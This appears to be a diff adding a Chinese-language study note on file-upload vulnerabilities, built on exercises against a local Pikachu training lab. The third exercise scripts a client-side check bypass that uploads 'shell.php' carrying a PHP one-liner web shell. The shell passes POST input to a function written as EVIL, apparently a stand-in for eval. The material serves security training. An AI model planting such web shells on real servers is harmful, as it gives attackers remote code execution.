@@ -1,0 +1,65 @@
+## 一、核心目标
+1.  实现文件后缀白名单校验，理解基础安全校验逻辑
+2.  编写基础文件上传POST请求，模拟正常上传流程
+3.  实现前端校验绕过检测脚本，验证漏洞存在性
+
+---
+
+## 二、代码实现与逐行解析
+
+### 习题1 基础：文件后缀白名单校验
+```python
+# 定义允许上传的文件后缀白名单
+allowed_ext = ["jpg", "png", "gif", "jpeg"]
+
+# 模拟用户上传的文件名
+upload_filename = "malicious.php"
+
+# 提取文件后缀
+file_ext = upload_filename.split(".")[-1].lower()
+
+# 校验文件后缀是否在白名单内
+if file_ext in allowed_ext:
+    print(f"文件{upload_filename} 校验通过，允许上传")
+else:
+    print(f"文件{upload_filename} 后缀非法，禁止上传")
+
+### 习题2 基础上传发包
+import requests
+url="http://127.0.0.1:9999/pikachu/vul/unsafeupload/clientcheck.php"
+headers={
+    "user-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "referer":"http://127.0.0.1:9999/pikachu/vul/unsafeupload/clientcheck.php"
+}
+data={"submit":"开始上传"}
+files={
+    "uploadfile":("test.gif",b"GIF89a fake","image/gif")
+}
+try:
+    response=requests.post(url,headers=headers,files=files,timeout=5)
+    print(f"响应状态码:{response.status_code}")
+    print(f"响应内容:{response.text[:100]}")
+except Exception as e:
+    print("请求失败原因:",str(e))
+
+### 习题3 前端校验绕过自动化检测
+import requests
+target_url="http://127.0.0.1:9999/pikachu/vul/unsafeupload/clientcheck.php"
+headers={
+    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Referer":"http://127.0.0.1:9999/pikachu/vul/unsafeupload/clientcheck.php"
+}
+data={"submit":"开始上传"}               ##submit 参数一定要加上，不然没有提交解析步骤
+def upload_check(filename,file_content,content_type):
+    files={"uploadfile":(filename,file_content,content_type)}
+    resp=requests.post(url=target_url,headers=headers,files=files,data=data,timeout=5)
+    return "上传成功" in resp.text
+if __name__ == "__main__":
+    print("=========文件上传前端绕过检测开始=========")
+    legal_result=upload_check("normal.png",b"GIF89a test","image/png")
+    print("合法图片上传结果:","成功" if legal_result else "失败")
+    shell_content=b"GIF89a <?php @EVIL($_POST['1']);?>"
+    bypass_result=upload_check("shell.php",shell_content,"image/png")
+    print("恶意脚本绕过结果:","成功" if bypass_result else "失败")
+    print("前端校验漏洞存在:","是" if bypass_result else "否")
+    print("=========检测完成=========")
